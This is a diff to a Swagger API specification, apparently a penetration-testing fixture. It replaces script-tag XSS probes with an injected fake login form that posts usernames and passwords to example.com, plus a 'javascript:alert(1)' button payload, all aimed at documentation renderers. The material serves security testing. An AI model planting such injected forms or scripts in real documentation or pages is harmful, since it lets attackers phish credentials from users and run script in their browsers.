@@ -1,36 +1,30 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: <script>alert('1')</scritp>
-  description: |
-    This API is designed for demonstration purposes only and contains a fake login form.
-    The form is not functional and is intended for testing HTML injection and XSS techniques.
-    <script>alert('1')</scritp>
-
+  title: Fake Login - HTML Injection
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : Resilience PT</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <form><button formaction=javascript:alert(1)>click
+            </div>
+        </form>
+    </div>
+</div>'
 paths:
-  /login:
+  /:
     post:
-      summary: Submit login form
-      description: |
-        This endpoint simulates a login action. It does not actually authenticate users but
-        demonstrates how an HTML form submission might be documented in an API specification.
-        **WARNING**: The following payload demonstrates an XSS attack:
-        <pre><code>&lt;script&gt;alert('XSS Payload')&lt;/script&gt;</code></pre>
-      parameters:
-        - name: username
-          in: formData
-          description: The username for login
-          required: true
-          type: string
-        - name: password
-          in: formData
-          description: The password for login
-          required: true
-          type: string
       responses:
         '200':
           description: Login successful
-        '400':
-          description: Bad request
-        '500':
-          description: Server error
